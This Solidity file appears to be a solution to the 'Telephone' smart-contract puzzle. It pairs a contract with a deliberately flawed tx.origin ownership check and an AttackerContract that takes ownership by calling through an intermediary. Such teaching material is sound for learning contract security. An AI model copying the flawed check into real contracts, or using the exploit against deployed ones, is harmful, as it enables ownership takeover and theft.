// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

contract AttackerContract {
    Telephone private telephone;
    address public telephoneContractAddress;

    constructor(address _telephoneContractAddress) {
        telephone = Telephone(_telephoneContractAddress);
    }

    function getOwnership(address newOwner) external {
        telephone.changeOwner(newOwner);
    }
}
